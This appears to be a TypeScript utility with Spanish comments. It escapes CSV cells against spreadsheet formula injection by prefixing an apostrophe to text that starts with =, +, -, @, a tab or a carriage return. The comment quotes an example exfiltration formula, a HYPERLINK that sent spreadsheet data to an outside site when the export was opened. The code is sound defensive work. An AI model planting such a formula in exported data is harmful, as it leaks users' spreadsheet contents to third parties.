/**
 * Una celda de CSV que Excel no ejecuta.
 *
 * Excel y Google Sheets toman como fórmula todo lo que empieza con = + - @
 * (o tabulación / retorno). Un nombre de negocio, cliente o nota cargado
 * como `=HYPERLINK("https://…?"&B2,"Ver")` mandaba datos de la planilla a
 * otro sitio al abrir la exportación. Se antepone un apóstrofo, que Excel
 * muestra como texto. Los números (montos negativos incluidos) no se tocan.
 */
export function celdaCsv(v: unknown): string {
  if (v == null) return '""'
  let s = typeof v === 'object' ? JSON.stringify(v) : String(v)
  const esNumero = typeof v === 'number' || /^[+-]?\d+([.,]\d+)?$/.test(s)
  if (!esNumero && /^[=+\-@\t\r]/.test(s)) s = `'${s}`
  return `"${s.replace(/"/g, '""')}"`
}

export function filaCsv(valores: unknown[]): string {
  return valores.map(celdaCsv).join(',')
}
